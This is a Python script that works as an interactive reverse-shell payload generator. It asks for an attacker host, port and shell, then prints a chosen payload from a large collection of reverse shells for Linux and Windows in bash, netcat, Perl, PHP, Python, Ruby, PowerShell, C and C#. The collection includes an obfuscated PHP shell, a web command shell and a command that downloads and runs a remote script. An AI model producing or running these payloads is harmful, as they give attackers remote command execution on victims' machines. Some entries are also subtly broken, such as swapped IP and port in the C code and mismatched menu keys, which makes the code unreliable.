shells = ["sh", "/bin/sh", "bash", "/bin/bash", "cmd", "powershell", "ash", "bsh", "csh", "ksh",
          "zsh", "pdksh", "tcsh"]
print("What is the Target OS? ")
targetos = input("1 - Linux\n2 - Windows")
ip = input("Enter LHOST: ")
port = input("Enter LPORT: ")
for i in shells:
    print(i)
shell = input("Choose shell type: ")

reverseshellslinux = {
    "Bash -i": "{} -i >& /dev/tcp/{}/{} 0>&1".format(shell, ip, port),
    "Bash 196": "0<&196;exec 196<>/dev/tcp/{}/{}; {} <&196 >&196 2>&196".format(ip, port, shell),
    "Bash read line": "exec 5<>/dev/tcp/1{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done".format(ip, port),
    "Bash 5": "{} -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5".format(shell, ip, port),
    "Bash udp": "{} -i >& /dev/udp/{}/{} 0>&1".format(shell, ip, port),
    "nc mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{} -i 2>&1|nc {} {} >/tmp/f".format(shell, ip, port),
    "nc -e": "nc -e {} {} {}".format(shell, ip, port),
    "nc -c": "nc -c {} {} {}".format(shell, ip, port),
    "ncat -e": "ncat {} {} -e {}".format(ip, port, shell),
    "ncat udp": "ncat {} {} -e {}".format(ip, port, shell),
    "C": """
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = {1};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{2}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"{3}", NULL};
    execve("{3}", argv, NULL);

    return 0;       
}
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "C#": """
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("{1}", {2}))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
    """.replace("{1}", ip).replace("{2}", port),
    "Haskell #1": """
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {3} -i 2>&1 | nc {1} {2} >/tmp/f"
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Perl": """
perl -e 'use Socket;$i="{1}";$p={2};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{3} -i");};'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Perl no sh": """
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
    """.format(ip, port),
    "PHP Emoji": """
php -r '$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "{1}";$💻 = {2};$🐚 = "{3}". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP PentestMonkey": """
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '{1}';
$port = {2};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {3} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string";
	}
}

?>
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP cmd": """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
    """,
    "PHP exe": """
php -r '$sock=fsockopen("{1}",{2});exec("{3} <&3 >&3 2>&3");'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP shell_exec": """
php -r '$sock=fsockopen("{1}",{2});shell_exec("{3} <&3 >&3 2>&3");'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP system": """
php -r '$sock=fsockopen("{1}",{2});system("{3} <&3 >&3 2>&3");'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP passthru": """
php -r '$sock=fsockopen("{1}",{2});passthru("{3} <&3 >&3 2>&3");'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP`": """
php -r '$sock=fsockopen("{1}",{2});`{3} <&3 >&3 2>&3`;'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "PHP popen": """
php -r '$sock=fsockopen("{1}",{2});popen("{3} <&3 >&3 2>&3", "r");'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Python #1": """
export RHOST="{1}";export RPORT={2};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{3}")'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Python #2": """
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{1}",{2}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{3}")'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Python3 #1": """
export RHOST="{1}";export RPORT={2};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{3}")
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Python3 #2": """
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{1}",{2}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{3}")'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Ruby #1": """
ruby -rsocket -e'f=TCPSocket.open("{1}",{2}).to_i;exec sprintf("{3} -i <&%d >&%d 2>&%d",f,f,f)'
    """.replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Ruby no sh":
        '''ruby -rsocket -e'exit if fork;c=TCPSocket.new("{1}","{2}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\''''
            .replace("{1}", ip).replace("{2}", port),

    "Socat #1": "socat TCP:{1}:{2} EXEC:{3}".replace("{1}", ip).replace("{2}", port).replace("{3}", shell),
    "Socat #2 (TTY)": "socat TCP:{1}:{2} EXEC:'{3}',pty,stderr,setsid,sigint,sane".replace("{1}", ip).replace("{2}",
                                                                                                              port).replace(
        "{3}", shell),
    "Java": """
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class shell {
    public static void main(String args[]) {
        String s;
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{1}/{2} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
    """.replace("{1}", ip).replace("{2}", port),
    "node.js": "require('child_process').exec('nc -e {3} {1} {2}')".replace("{1}", ip).replace("{2}", port).replace(
        "{3}", shell),
    "Telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {1} {2} 0<$TF | {3} 1>$TF".replace("{1}", ip).replace("{2}",
                                                                                                          port).replace(
        "{3}", shell),
    "zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'".format(ip, port),

    "Windows ConPty": """
    IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {1} {2}
    """.replace("{1}", ip).replace("{2}", port),

    "PowerShell #1": """
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{1}",{2});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    """.replace("{1}", ip).replace("{2}", port),

    "PowerShell #2": """
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{1}',{2});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    """.replace("{1}", ip).replace("{2}", port),

    "PowerShell #3": """
    powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{1}', {2});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
    """.replace("{1}", ip).replace("{2}", port),

    "PowerShell #4 (TLS)": """
    powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{1}', {2});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
    """.replace("{1}", ip).replace("{2}", port),

}
langchoicelinux = {
    "1": "Bash -i",
    "2": "Bash 196",
    "3": "Bash read line",
    "4": "Bash 5",
    "5": "Bash udp",
    "6": "nc mkfifo",
    "7": "nc -e",
    "8": "nc -c",
    "9": "ncat -e",
    "10": "ncat -c",
    "11": "C",
    "12": "C#",
    "13": "Haskell #1",
    "14": "Perl",
    "15": "Perl no sh",
    "16": "PHP Emoji",
    "17": "PHP PentestMonkey",
    "18": "PHP cmd",
    "19": "PHP exe",
    "20": "PHP shell_exec",
    "21": "PHP system",
    "22": "PHP passthru",
    "23": "PHP`",
    "24": "PHP popen",
    "25": "Python #1",
    "26": "Python #2",
    "27": "Python3 #1",
    "28": "Python3 #2",
    "29": "Ruby #1",
    "30": "ruby no sh",
    "31": "Socat #1",
    "32": "Socat #2",
    "33": "Java",
    "34": "node.js",
    "35": "Telnet",
    "36": "zsh"

}

langchoicewin = {
    "1": "nc.exe -e",
    "2": "ncat.exe -e",
    "3": "C",
    "4": "C#",
    "5": "PHP PentestMonkey",
    "6": "php cmd",
    "7": "PHP system",
    "8": "PHP`",
    "9": "PHP popen",
    "10": "Windows ConPty",
    "11": "PowerShell #1",
    "12": "PowerShell #2",
    "13": "PowerShell #3",
    "14": "PowerShell #4 (TLS)",
}

if targetos == "1":
    for i in langchoicelinux:
        print(i + " - " + langchoicelinux[i])
    print("Please choose language:")
    lang = input(" ")
    langg = langchoicelinux[lang]
    print(reverseshellslinux[langg])

elif targetos == "2":
    for i in langchoicewin:
        print(i + " - " + langchoicewin[i])
    print("Please choose language:")
    lang = input(" ")
    langg = langchoicewin[lang]
    print(reverseshellslinux[langg])
